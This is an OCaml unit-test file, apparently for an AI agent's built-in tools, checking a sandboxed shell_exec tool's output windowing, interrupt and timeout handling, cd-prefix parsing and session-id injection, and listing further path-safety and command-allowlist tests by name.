let test_shell_exec_head_or_tail_only_window_output () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let head_result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String "printf 'a1\na2\na3\na4\n'");
                  ("head", `Int 2);
                ]))
      in
      let tail_result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String "printf 'b1\nb2\nb3\nb4\n'");
                  ("tail", `Int 2);
                ]))
      in
      Alcotest.(check bool)
        "head-only keeps first line" true
        (contains head_result "a1\na2");
      Alcotest.(check bool)
        "head-only omits trailing line" false
        (contains head_result "a4");
      Alcotest.(check bool)
        "head-only marker visible" true
        (contains head_result "omitted 2 trailing lines; showing first 2 of 4");
      Alcotest.(check bool)
        "tail-only keeps last line" true
        (contains tail_result "b3\nb4");
      Alcotest.(check bool)
        "tail-only omits leading line" false
        (contains tail_result "b1");
      Alcotest.(check bool)
        "tail-only marker visible" true
        (contains tail_result "omitted 2 leading lines; showing last 2 of 4"))

let test_shell_exec_saves_full_output_when_windowed () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let command = "printf 'x1\nx2\nx3\nx4\nx5\n'" in
      let result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc
                [
                  ("command", `String command);
                  ("head", `Int 2);
                  ("tail", `Int 2);
                ]))
      in
      Alcotest.(check bool)
        "windowed output mentions saved stdout path" true
        (Option.is_some (extract_saved_output_path result));
      let path = Option.get (extract_saved_output_path result) in
      let ic = open_in path in
      let saved = really_input_string ic (in_channel_length ic) in
      close_in ic;
      Alcotest.(check string)
        "saved output preserves omitted lines" "x1\nx2\nx3\nx4\nx5\n" saved;
      Sys.remove path)

let test_shell_exec_rejects_non_positive_head_or_tail () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let result_head =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc [ ("command", `String "printf 'ok'"); ("head", `Int 0) ]))
      in
      let result_tail =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc [ ("command", `String "printf 'ok'"); ("tail", `Int (-1)) ]))
      in
      Alcotest.(check string)
        "head validation" "Error: head must be >= 1" result_head;
      Alcotest.(check string)
        "tail validation" "Error: tail must be >= 1" result_tail)

let test_shell_exec_interrupts_running_process () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let interrupted = ref None in
      let started_at = Unix.gettimeofday () in
      let result =
        Lwt_main.run
          (let open Lwt.Syntax in
           let trigger =
             let* () = Lwt_unix.sleep 0.03 in
             interrupted := Some "stop now";
             Lwt.return_unit
           in
           let invoke =
             tool.Tool.invoke
               ~context:
                 {
                   Tool.session_key = Some "web:test";
                   send_progress = None;
                   interrupt_check = Some (fun () -> !interrupted);
                 }
               (`Assoc [ ("command", `String "sleep 10") ])
           in
           let* result, () = Lwt.both invoke trigger in
           Lwt.return result)
      in
      let elapsed = Unix.gettimeofday () -. started_at in
      Alcotest.(check string)
        "interrupt result" "Command interrupted by user." result;
      Alcotest.(check bool) "returns promptly" true (elapsed < 2.0))

let test_shell_exec_interrupt_kills_descendants () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let interrupted = ref None in
      let pid_file = Filename.concat workspace "child.pid" in
      let command =
        Printf.sprintf
          "sleep 10 & child=$!; printf '%%s' \"$child\" > %s; wait $child"
          (Filename.quote pid_file)
      in
      let result =
        Lwt_main.run
          (let open Lwt.Syntax in
           let trigger =
             let rec wait_for_pid_file attempts =
               if Sys.file_exists pid_file || attempts <= 0 then Lwt.return_unit
               else
                 let* () = Lwt_unix.sleep 0.02 in
                 wait_for_pid_file (attempts - 1)
             in
             let* () = wait_for_pid_file 50 in
             interrupted := Some "stop now";
             Lwt.return_unit
           in
           let invoke =
             tool.Tool.invoke
               ~context:
                 {
                   Tool.session_key = Some "web:test";
                   send_progress = None;
                   interrupt_check = Some (fun () -> !interrupted);
                 }
               (`Assoc [ ("command", `String command) ])
           in
           let* result, () = Lwt.both invoke trigger in
           Lwt.return result)
      in
      let child_pid =
        let ic = open_in pid_file in
        Fun.protect
          (fun () -> int_of_string (input_line ic))
          ~finally:(fun () -> close_in ic)
      in
      let rec wait_until_gone attempts =
        if attempts <= 0 || not (process_exists child_pid) then ()
        else begin
          Unix.sleepf 0.05;
          wait_until_gone (attempts - 1)
        end
      in
      wait_until_gone 20;
      Alcotest.(check string)
        "interrupt result" "Command interrupted by user." result;
      Alcotest.(check bool)
        "child process terminated" false (process_exists child_pid);
      Sys.remove pid_file)

let test_shell_exec_timeout_kills_descendants () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let pid_file = Filename.concat workspace "child-timeout.pid" in
      let command =
        Printf.sprintf
          "sleep 10 & child=$!; printf '%%s' \"$child\" > %s; wait $child"
          (Filename.quote pid_file)
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke
             (`Assoc [ ("command", `String command); ("timeout", `Float 0.2) ]))
      in
      let child_pid =
        let ic = open_in pid_file in
        Fun.protect
          (fun () -> int_of_string (input_line ic))
          ~finally:(fun () -> close_in ic)
      in
      let rec wait_until_gone attempts =
        if attempts <= 0 || not (process_exists child_pid) then ()
        else begin
          Unix.sleepf 0.05;
          wait_until_gone (attempts - 1)
        end
      in
      wait_until_gone 20;
      Alcotest.(check string)
        "timeout result" "Error: command timed out after 0 seconds" result;
      Alcotest.(check bool)
        "child process terminated after timeout" false
        (process_exists child_pid);
      Sys.remove pid_file)

let test_extract_cd_prefix () =
  let opt = Alcotest.option (Alcotest.pair Alcotest.string Alcotest.string) in
  Alcotest.(check opt)
    "simple cd && cmd"
    (Some ("/home/user/project", "make build"))
    (Tools_builtin.extract_cd_prefix "cd /home/user/project && make build");
  Alcotest.(check opt)
    "with extra spaces"
    (Some ("/tmp/dir", "ls -la"))
    (Tools_builtin.extract_cd_prefix "  cd   /tmp/dir   &&   ls -la  ");
  Alcotest.(check opt)
    "no cd prefix" None
    (Tools_builtin.extract_cd_prefix "make build");
  Alcotest.(check opt)
    "relative cd path returns None" None
    (Tools_builtin.extract_cd_prefix "cd relative/path && make build");
  Alcotest.(check opt)
    "empty rest returns None" None
    (Tools_builtin.extract_cd_prefix "cd /tmp &&");
  Alcotest.(check opt)
    "cd with opam exec"
    (Some
       ( "/home/xertrov/src/clawq.b132",
         "opam exec --switch=clawq-5.1 -- dune build" ))
    (Tools_builtin.extract_cd_prefix
       "cd /home/xertrov/src/clawq.b132 && opam exec --switch=clawq-5.1 -- \
        dune build");
  Alcotest.(check opt)
    "just cd no &&" None
    (Tools_builtin.extract_cd_prefix "cd /tmp")

let test_shell_exec_injects_session_id_env () =
  with_temp_workspace (fun workspace ->
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let context =
        {
          Tool.session_key = Some "telegram:42:testuser";
          send_progress = None;
          interrupt_check = None;
        }
      in
      let result =
        Lwt_main.run
          (tool.Tool.invoke ~context
             (`Assoc [ ("command", `String "printenv CLAWQ_SESSION_ID") ]))
      in
      let contains s sub =
        let slen = String.length s and nlen = String.length sub in
        let rec loop i =
          if i + nlen > slen then false
          else if String.sub s i nlen = sub then true
          else loop (i + 1)
        in
        nlen = 0 || loop 0
      in
      Alcotest.(check bool)
        "output contains session id" true
        (contains result "telegram:42:testuser");
      Alcotest.(check bool) "exit code 0" true (contains result "exit_code: 0"))

let test_shell_exec_cd_prefix_optimization () =
  with_temp_workspace (fun workspace ->
      let subdir = Filename.concat workspace "subdir" in
      Unix.mkdir subdir 0o755;
      let sandbox =
        Sandbox.create ~backend:Sandbox.None ~workspace ~extra_allowed_paths:[]
          ~workspace_only:false ()
      in
      let tool =
        Tools_builtin.shell_exec ~workspace ~workspace_only:false
          ~allowed_commands:[] ~extra_allowed_paths:[] ~sandbox
      in
      let command = Printf.sprintf "cd %s && pwd" subdir in
      let result =
        Lwt_main.run
          (tool.Tool.invoke (`Assoc [ ("command", `String command) ]))
      in
      let has_substr s sub =
        let slen = String.length s and nlen = String.length sub in
        let rec loop i =
          if i + nlen > slen then false
          else if String.sub s i nlen = sub then true
          else loop (i + 1)
        in
        nlen = 0 || loop 0
      in
      Alcotest.(check bool)
        "output contains subdir path" true (has_substr result subdir);
      Alcotest.(check bool)
        "exit code 0" true
        (has_substr result "exit_code: 0"))

let suite =
  [
    Alcotest.test_case "normalize absolute" `Quick test_normalize_absolute;
    Alcotest.test_case "normalize dot" `Quick test_normalize_dot;
    Alcotest.test_case "normalize dotdot" `Quick test_normalize_dotdot;
    Alcotest.test_case "normalize relative" `Quick test_normalize_relative;
    Alcotest.test_case "normalize empty segments" `Quick
      test_normalize_empty_segments;
    Alcotest.test_case "normalize trailing slash" `Quick
      test_normalize_trailing_slash;
    Alcotest.test_case "normalize root" `Quick test_normalize_root;
    Alcotest.test_case "path safe inside workspace" `Quick
      test_path_safe_inside_workspace;
    Alcotest.test_case "path safe workspace root" `Quick
      test_path_safe_workspace_root;
    Alcotest.test_case "path safe outside workspace" `Quick
      test_path_safe_outside_workspace;
    Alcotest.test_case "path safe dotdot escape" `Quick
      test_path_safe_dotdot_escape;
    Alcotest.test_case "path safe sibling dir" `Quick test_path_safe_sibling_dir;
    Alcotest.test_case "path safe nested" `Quick test_path_safe_nested;
    Alcotest.test_case "path safe prefix trick" `Quick
      test_path_safe_prefix_trick;
    Alcotest.test_case "command allowed in list" `Quick
      test_command_allowed_in_list;
    Alcotest.test_case "command not in list" `Quick test_command_not_in_list;
    Alcotest.test_case "command empty string" `Quick test_command_empty_string;
    Alcotest.test_case "command with path prefix" `Quick
      test_command_with_path_prefix;
    Alcotest.test_case "command with args" `Quick test_command_with_args;
    Alcotest.test_case "command env var prefix" `Quick
      test_command_env_var_prefix;
    Alcotest.test_case "default allowlist includes basics" `Quick
      test_command_default_allowlist_includes_basics;
    Alcotest.test_case "web_search reads live config after registry refresh"
      `Quick test_web_search_reads_live_config_after_registry_refresh;
    Alcotest.test_case "registry remove drops tool" `Quick
      test_registry_remove_drops_tool;
    Alcotest.test_case "zai websearch requires api key" `Quick
      test_zai_websearch_requires_api_key;
    Alcotest.test_case "register builtin tools includes enabled zai tools"
      `Quick test_register_builtin_tools_includes_enabled_zai_tools;
    Alcotest.test_case "refresh replaces config-bound tools" `Quick
      test_refresh_replaces_config_bound_tools;
    Alcotest.test_case "safe command no special chars" `Quick
      test_safe_command_no_special;
    Alcotest.test_case "unsafe semicolon" `Quick test_unsafe_semicolon;
    Alcotest.test_case "unsafe pipe" `Quick test_unsafe_pipe;
    Alcotest.test_case "unsafe redirect" `Quick test_unsafe_redirect;
    Alcotest.test_case "unsafe dollar paren" `Quick test_unsafe_dollar_paren;
    Alcotest.test_case "unsafe backtick" `Quick test_unsafe_backtick;
    Alcotest.test_case "unsafe ampersand" `Quick test_unsafe_ampersand;
    Alcotest.test_case "extract command simple" `Quick
      test_extract_command_simple;
    Alcotest.test_case "extract command with path" `Quick
      test_extract_command_with_path;
    Alcotest.test_case "extract command env prefix" `Quick
      test_extract_command_env_prefix;
    Alcotest.test_case "extract command empty" `Quick test_extract_command_empty;
    Alcotest.test_case "extract command only env" `Quick
      test_extract_command_only_env;
    Alcotest.test_case "path safe dot in path" `Quick
      test_path_safe_symlink_like;
    Alcotest.test_case "path safe symlink resolves inside workspace" `Quick
      test_path_safe_symlink_resolves_inside_workspace;
    Alcotest.test_case "unsafe double ampersand" `Quick
      test_unsafe_double_ampersand;
    Alcotest.test_case "safe command with flags" `Quick
      test_safe_single_command_with_flags;
    Alcotest.test_case "path safety random conformance" `Quick
      test_path_safety_random_conformance;
    Alcotest.test_case "shell safety random conformance" `Quick
      test_shell_safety_random_conformance;
    Alcotest.test_case "send_message uses send_fn over send_progress" `Quick
      test_send_message_uses_send_fn_over_send_progress;
    Alcotest.test_case "send_message falls back to notify channel" `Quick
      test_send_message_falls_back_to_notify_channel;
    Alcotest.test_case "send_message errors without notifier" `Quick
      test_send_message_errors_without_any_notifier;
    Alcotest.test_case "send_message with buttons via rich notifier" `Quick
      test_send_message_with_buttons_rich_notifier;
    Alcotest.test_case "send_message with buttons text fallback" `Quick
      test_send_message_with_buttons_text_fallback;
    Alcotest.test_case "send_message plain text via rich notifier" `Quick
      test_send_message_plain_text_via_rich_notifier;
    Alcotest.test_case "send_message plain text rich fallback no session" `Quick
      test_send_message_plain_text_rich_fallback_no_session;
    Alcotest.test_case "send_poll with rich notifier" `Quick
      test_send_poll_rich_notifier;
    Alcotest.test_case "send_poll text fallback" `Quick
      test_send_poll_text_fallback;
    Alcotest.test_case "send_poll validation" `Quick test_send_poll_validation;
    Alcotest.test_case "rich_message to_fallback_text" `Quick
      test_rich_message_to_fallback_text;
    Alcotest.test_case "doc_write creates file" `Quick test_doc_write_creates;
    Alcotest.test_case "doc_write appends" `Quick test_doc_write_appends;
    Alcotest.test_case "doc_write rejects traversal" `Quick
      test_doc_write_rejects_traversal;
    Alcotest.test_case "doc_write known file note" `Quick
      test_doc_write_known_file;
    Alcotest.test_case "shell_exec saves full output when truncated" `Quick
      test_shell_exec_saves_full_output_when_truncated;
    Alcotest.test_case "shell_exec head and tail window output" `Quick
      test_shell_exec_head_and_tail_window_output;
    Alcotest.test_case "shell_exec window handles trailing newline" `Quick
      test_shell_exec_head_tail_window_handles_trailing_newline;
    Alcotest.test_case "shell_exec head or tail only window output" `Quick
      test_shell_exec_head_or_tail_only_window_output;
    Alcotest.test_case "shell_exec saves full output when windowed" `Quick
      test_shell_exec_saves_full_output_when_windowed;
    Alcotest.test_case "shell_exec validates head and tail" `Quick
      test_shell_exec_rejects_non_positive_head_or_tail;
    Alcotest.test_case "shell_exec interrupts running process" `Quick
      test_shell_exec_interrupts_running_process;
    Alcotest.test_case "shell_exec interrupt kills descendants" `Quick
      test_shell_exec_interrupt_kills_descendants;
    Alcotest.test_case "shell_exec timeout kills descendants" `Quick
      test_shell_exec_timeout_kills_descendants;
    Alcotest.test_case "extract_cd_prefix parses cd path && cmd" `Quick
      test_extract_cd_prefix;
    Alcotest.test_case "shell_exec cd prefix optimization sets cwd" `Quick
      test_shell_exec_cd_prefix_optimization;
    Alcotest.test_case "shell_exec injects CLAWQ_SESSION_ID env" `Quick
      test_shell_exec_injects_session_id_env;
  ]
